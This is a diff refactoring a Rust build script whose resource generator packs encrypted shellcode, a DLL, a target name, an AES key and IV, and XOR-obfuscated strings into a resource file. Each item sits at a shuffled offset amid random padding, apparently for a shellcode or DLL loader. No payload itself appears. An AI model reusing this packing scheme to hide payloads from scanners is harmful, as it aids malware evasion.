@@ -10,27 +10,7 @@ include!("build_util.rs");
 
 type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);
 
-struct AESString {
-    string_name: &'static str,
-    encrypted: Vec<u8>,
-    offset: usize,
-}
-
 struct XORString {
-    string_name: &'static str,
-    encrypted: Vec<u8>,
-    offset: usize,
-    key: Vec<u8>,
-    key_offset: usize,
-}
-
-struct AESHash {
-    string_name: &'static str,
-    encrypted: Vec<u8>,
-    offset: usize,
-}
-
-struct XORHash {
     string_name: &'static str,
     encrypted: Vec<u8>,
     offset: usize,
@@ -87,30 +67,28 @@ impl ResourceGenerator {
             vec![]
         };
 
-        let mut xor_strings = vec![];
-        for string_name in XOR_STRINGS {
+        let xor_strings = XOR_STRINGS.iter().map(|string_name| {
             let key = generate_random_bytes(string_name.len());
-            let encrypted = xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]);
-            xor_strings.push(XORString {
+            XORString {
                 string_name,
-                encrypted,
+                encrypted:xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
                 offset: usize::MAX,
                 key,
                 key_offset: usize::MAX,
-            });
-        }
+            }
+        }).collect();
 
         ResourceGenerator {
             aes_key,
-            aes_key_offset: 0,
+            aes_key_offset: usize::MAX,
             aes_iv,
-            aes_iv_offset: 0,
+            aes_iv_offset: usize::MAX,
             target,
-            target_offset: 0,
+            target_offset: usize::MAX,
             shellcode,
-            shellcode_offset: 0,
+            shellcode_offset: usize::MAX,
             dll,
-            dll_offset: 0,
+            dll_offset: usize::MAX,
             xor_strings,
         }
     }
@@ -126,9 +104,6 @@ impl ResourceGenerator {
         ];
 
         functions.resize(functions.len() + self.xor_strings.len(), ResourceGenerator::add_xor_string_to_payload);
-        // for _ in &self.xor_strings {
-        //     functions.push(ResourceGenerator::add_xor_string_to_payload);
-        // }
 
         self.xor_strings.shuffle(&mut rand::thread_rng());
         functions.shuffle(&mut rand::thread_rng());
@@ -137,8 +112,8 @@ impl ResourceGenerator {
             function(self, &mut resource)
         }
 
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
-        resource.extend(bytes);
+        let end_pad = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        resource.extend(end_pad);
 
         if !Path::new("rsrc/").is_dir() {
             fs::create_dir("rsrc/").expect("Could not create directory");
@@ -148,7 +123,7 @@ impl ResourceGenerator {
     }
 
     fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         self.target_offset = payload.len();
@@ -156,7 +131,7 @@ impl ResourceGenerator {
     }
 
     fn add_xor_string_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         let mut xor_string = self.xor_strings.pop().expect("No string info to pop!");
@@ -164,7 +139,7 @@ impl ResourceGenerator {
         payload.extend(&xor_string.encrypted);
 
         //put the key in after
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         xor_string.key_offset = payload.len();
@@ -173,7 +148,7 @@ impl ResourceGenerator {
     }
 
     fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         self.aes_key_offset = payload.len();
@@ -181,7 +156,7 @@ impl ResourceGenerator {
     }
 
     fn add_aes_iv_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         self.aes_iv_offset = payload.len();
@@ -189,7 +164,7 @@ impl ResourceGenerator {
     }
 
     fn add_shellcode_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         self.shellcode_offset = payload.len();
@@ -197,7 +172,7 @@ impl ResourceGenerator {
     }
 
     fn add_dll_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         payload.extend(bytes);
 
         self.dll_offset = payload.len();
